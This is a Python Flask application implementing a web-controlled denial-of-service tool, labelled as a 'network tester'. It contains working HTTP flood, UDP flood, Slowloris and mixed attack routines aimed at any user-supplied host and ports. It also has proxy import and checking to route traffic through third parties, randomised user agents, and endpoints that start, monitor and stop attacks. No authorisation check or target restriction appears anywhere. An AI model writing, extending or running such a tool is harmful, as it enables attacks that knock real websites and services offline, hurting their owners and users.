from flask import Flask, render_template, request, jsonify
import threading
import time
import random
import socket
import os
import json
from concurrent.futures import ThreadPoolExecutor
import requests

app = Flask(__name__)

# Global storage
attack_status = {
    'is_running': False,
    'requests_sent': 0,
    'successful_requests': 0,
    'failed_requests': 0,
    'packets_sent': 0,
    'current_method': '',
    'start_time': None,
    'rps_history': [],
    'current_rps': 0,
    'avg_rps': 0,
    'active_connections': []
}

proxies_list = []
active_proxies = []

class WebNetworkTester:
    def __init__(self):
        self.is_testing = False
        
    def ultra_http_flood(self, target, ports, duration, threads_count, max_requests, use_proxies):
        """HTTP Flood attack with multiple ports and proxy support"""
        end_time = time.time() + duration
        request_count = 0
        
        def worker(worker_id):
            nonlocal request_count
            local_count = 0
            while (time.time() < end_time and self.is_testing and 
                   (max_requests == 0 or request_count < max_requests)):
                try:
                    # Select random port
                    port = random.choice(ports)
                    
                    # Get proxy if enabled
                    proxy_config = None
                    if use_proxies and active_proxies:
                        proxy_config = random.choice(active_proxies)
                    
                    # Make request
                    if proxy_config:
                        proxies = {
                            'http': f"{proxy_config['type'].lower()}://{proxy_config['address']}:{proxy_config['port']}",
                            'https': f"{proxy_config['type'].lower()}://{proxy_config['address']}:{proxy_config['port']}"
                        }
                        response = requests.get(
                            f"http://{target}:{port}/?{random.randint(1000,9999)}", 
                            timeout=2,
                            headers={'User-Agent': self.get_random_ua()},
                            proxies=proxies
                        )
                    else:
                        response = requests.get(
                            f"http://{target}:{port}/?{random.randint(1000,9999)}", 
                            timeout=2,
                            headers={'User-Agent': self.get_random_ua()}
                        )
                    
                    attack_status['successful_requests'] += 1
                    local_count += 1
                    request_count += 1
                    
                    # Update connection info
                    conn_info = {
                        'type': 'HTTP',
                        'target': f"{target}:{port}",
                        'proxy': proxy_config['address'] if proxy_config else 'Direct',
                        'status': 'Success',
                        'timestamp': time.time()
                    }
                    attack_status['active_connections'].append(conn_info)
                    # Keep only last 50 connections
                    attack_status['active_connections'] = attack_status['active_connections'][-50:]
                    
                except Exception as e:
                    attack_status['failed_requests'] += 1
                    request_count += 1
                
                attack_status['requests_sent'] += 1
                
                # Update RPS calculations
                current_time = time.time()
                if attack_status['start_time']:
                    elapsed = current_time - attack_status['start_time']
                    if elapsed > 0:
                        attack_status['current_rps'] = attack_status['requests_sent'] / elapsed
                        attack_status['rps_history'].append(attack_status['current_rps'])
                        attack_status['rps_history'] = attack_status['rps_history'][-100:]
                        if attack_status['rps_history']:
                            attack_status['avg_rps'] = sum(attack_status['rps_history']) / len(attack_status['rps_history'])
        
        with ThreadPoolExecutor(max_workers=threads_count) as executor:
            futures = [executor.submit(worker, i) for i in range(threads_count)]
            for future in futures:
                future.result()

    def enhanced_udp_flood(self, target, ports, duration, threads_count, max_requests, use_proxies):
        """Enhanced UDP Flood attack"""
        end_time = time.time() + duration
        packet_size = 1024
        request_count = 0
        
        def udp_worker(worker_id):
            nonlocal request_count
            while (time.time() < end_time and self.is_testing and 
                   (max_requests == 0 or request_count < max_requests)):
                try:
                    port = random.choice(ports)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    
                    # Generate random payload
                    payload = os.urandom(packet_size)
                    sock.sendto(payload, (target, port))
                    sock.close()
                    
                    attack_status['packets_sent'] += 1
                    request_count += 1
                    attack_status['requests_sent'] += 1
                    
                    # Update connection info
                    conn_info = {
                        'type': 'UDP',
                        'target': f"{target}:{port}",
                        'proxy': 'N/A (UDP)',
                        'status': 'Sent',
                        'timestamp': time.time()
                    }
                    attack_status['active_connections'].append(conn_info)
                    attack_status['active_connections'] = attack_status['active_connections'][-50:]
                    
                except Exception as e:
                    attack_status['failed_requests'] += 1
                    request_count += 1
                    attack_status['requests_sent'] += 1
        
        with ThreadPoolExecutor(max_workers=threads_count) as executor:
            futures = [executor.submit(udp_worker, i) for i in range(threads_count)]
            for future in futures:
                future.result()

    def slowloris_attack(self, target, ports, duration, threads_count, max_requests, use_proxies):
        """Slowloris attack"""
        end_time = time.time() + duration
        sockets = []
        request_count = 0
        
        def slowloris_worker():
            nonlocal request_count
            try:
                port = random.choice(ports)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((target, port))
                
                # Send partial headers
                headers = [
                    f"GET /?{random.randint(1000,9999)} HTTP/1.1\r\n",
                    f"Host: {target}\r\n",
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                ]
                
                for header in headers:
                    sock.send(header.encode())
                    time.sleep(1)
                
                sockets.append(sock)
                request_count += 1
                
                # Update connection info
                conn_info = {
                    'type': 'Slowloris',
                    'target': f"{target}:{port}",
                    'proxy': 'Direct',
                    'status': 'Connected',
                    'timestamp': time.time()
                }
                attack_status['active_connections'].append(conn_info)
                attack_status['active_connections'] = attack_status['active_connections'][-50:]
                
                # Keep connection alive
                while time.time() < end_time and self.is_testing:
                    try:
                        keep_alive = f"X-a: {random.randint(1000,9999)}\r\n"
                        sock.send(keep_alive.encode())
                        time.sleep(10)
                    except:
                        break
                        
            except Exception as e:
                request_count += 1
        
        with ThreadPoolExecutor(max_workers=min(threads_count, 200)) as executor:
            futures = [executor.submit(slowloris_worker) for _ in range(min(threads_count, 200))]
            for future in futures:
                future.result()
        
        # Close all sockets
        for sock in sockets:
            try:
                sock.close()
            except:
                pass

    def mixed_attack(self, target, ports, duration, threads_count, max_requests, use_proxies):
        """Mixed attack using multiple methods"""
        end_time = time.time() + duration
        
        def http_worker():
            request_count = 0
            while (time.time() < end_time and self.is_testing and 
                   (max_requests == 0 or request_count < max_requests)):
                try:
                    port = random.choice(ports)
                    response = requests.get(f"http://{target}:{port}/", timeout=2)
                    attack_status['successful_requests'] += 1
                    request_count += 1
                except:
                    attack_status['failed_requests'] += 1
                    request_count += 1
                attack_status['requests_sent'] += 1
        
        def udp_worker():
            request_count = 0
            while (time.time() < end_time and self.is_testing and 
                   (max_requests == 0 or request_count < max_requests)):
                try:
                    port = random.choice(ports)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    payload = os.urandom(512)
                    sock.sendto(payload, (target, port))
                    sock.close()
                    attack_status['packets_sent'] += 1
                    request_count += 1
                except:
                    request_count += 1
                attack_status['requests_sent'] += 1
        
        # Use half threads for HTTP, half for UDP
        http_threads = max(1, threads_count // 2)
        udp_threads = max(1, threads_count // 2)
        
        with ThreadPoolExecutor(max_workers=threads_count) as executor:
            http_futures = [executor.submit(http_worker) for _ in range(http_threads)]
            udp_futures = [executor.submit(udp_worker) for _ in range(udp_threads)]
            
            for future in http_futures + udp_futures:
                future.result()

    def get_random_ua(self):
        """Get random user agent"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"
        ]
        return random.choice(user_agents)

tester = WebNetworkTester()

# Proxy Management Functions
def load_proxies():
    """Load proxies from file"""
    global proxies_list, active_proxies
    try:
        # In a real application, you'd load from a database or file
        # For now, we'll keep them in memory
        proxies_list = []
        active_proxies = []
    except:
        proxies_list = []
        active_proxies = []

def save_proxies():
    """Save proxies to file"""
    # In a real application, you'd save to a database or file
    pass

def check_proxy(proxy):
    """Check if a proxy is working"""
    try:
        start_time = time.time()
        proxies = {
            'http': f"{proxy['type'].lower()}://{proxy['address']}:{proxy['port']}",
            'https': f"{proxy['type'].lower()}://{proxy['address']}:{proxy['port']}"
        }
        response = requests.get('http://httpbin.org/ip', timeout=10, proxies=proxies)
        response_time = round((time.time() - start_time) * 1000, 2)
        
        if response.status_code == 200:
            return {
                'proxy': proxy,
                'status': 'Working',
                'response_time': response_time,
                'actual_ip': 'Checked'
            }
    except:
        pass
    
    return {
        'proxy': proxy,
        'status': 'Failed',
        'response_time': 0,
        'actual_ip': 'Unknown'
    }

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/get_proxies')
def get_proxies():
    return jsonify({
        'proxies': proxies_list,
        'active_count': len(active_proxies),
        'total_count': len(proxies_list)
    })

@app.route('/add_proxy', methods=['POST'])
def add_proxy():
    data = request.json
    proxy = {
        'type': data['type'],
        'address': data['address'],
        'port': int(data['port']),
        'username': data.get('username', ''),
        'password': data.get('password', '')
    }
    
    # Check for duplicates
    if not any(p['address'] == proxy['address'] and p['port'] == proxy['port'] for p in proxies_list):
        proxies_list.append(proxy)
        active_proxies.append(proxy)
        save_proxies()
        return jsonify({'status': 'success', 'message': 'Proxy added successfully'})
    else:
        return jsonify({'status': 'error', 'message': 'Proxy already exists'})

@app.route('/import_proxies', methods=['POST'])
def import_proxies():
    data = request.json
    text = data['text']
    imported = 0
    errors = 0
    
    lines = text.split('\n')
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        try:
            if ':' in line:
                parts = line.split(':')
                if len(parts) >= 2:
                    proxy_type = "HTTP"
                    address = parts[0]
                    port = int(parts[1])
                    
                    proxy = {
                        'type': proxy_type,
                        'address': address,
                        'port': port,
                        'username': '',
                        'password': ''
                    }
                    
                    if not any(p['address'] == address and p['port'] == port for p in proxies_list):
                        proxies_list.append(proxy)
                        active_proxies.append(proxy)
                        imported += 1
                    else:
                        errors += 1
        except:
            errors += 1
    
    save_proxies()
    return jsonify({
        'status': 'success', 
        'message': f'Imported {imported} proxies, {errors} failed'
    })

@app.route('/check_proxies', methods=['POST'])
def check_proxies_route():
    def check_all_proxies():
        global active_proxies
        working_proxies = []
        
        for proxy in proxies_list:
            result = check_proxy(proxy)
            if result['status'] == 'Working':
                working_proxies.append(proxy)
        
        active_proxies = working_proxies
        save_proxies()
    
    # Run in background thread
    thread = threading.Thread(target=check_all_proxies)
    thread.daemon = True
    thread.start()
    
    return jsonify({'status': 'success', 'message': 'Proxy check started'})

@app.route('/start_attack', methods=['POST'])
def start_attack():
    data = request.json
    target = data['target']
    ports = [int(p.strip()) for p in data['ports'].split(',')]
    duration = int(data['duration'])
    threads = int(data['threads'])
    max_requests = int(data['max_requests'])
    method = data['method']
    use_proxies = data.get('use_proxies', False)
    
    # Reset status
    attack_status.update({
        'is_running': True,
        'requests_sent': 0,
        'successful_requests': 0,
        'failed_requests': 0,
        'packets_sent': 0,
        'current_method': method,
        'start_time': time.time(),
        'rps_history': [],
        'current_rps': 0,
        'avg_rps': 0,
        'active_connections': []
    })
    
    # Start attack in background thread
    def run_attack():
        tester.is_testing = True
        try:
            if method == 'http_flood':
                tester.ultra_http_flood(target, ports, duration, threads, max_requests, use_proxies)
            elif method == 'udp_flood':
                tester.enhanced_udp_flood(target, ports, duration, threads, max_requests, use_proxies)
            elif method == 'slowloris':
                tester.slowloris_attack(target, ports, duration, threads, max_requests, use_proxies)
            elif method == 'mixed':
                tester.mixed_attack(target, ports, duration, threads, max_requests, use_proxies)
        except Exception as e:
            print(f"Attack error: {e}")
        finally:
            tester.is_testing = False
            attack_status['is_running'] = False
    
    thread = threading.Thread(target=run_attack)
    thread.daemon = True
    thread.start()
    
    return jsonify({'status': 'Attack started'})

@app.route('/attack_status')
def get_attack_status():
    return jsonify(attack_status)

@app.route('/stop_attack')
def stop_attack():
    tester.is_testing = False
    attack_status['is_running'] = False
    return jsonify({'status': 'Attack stopped'})

# Initialize
load_proxies()

if __name__ == '__main__':
    app.run(debug=True)
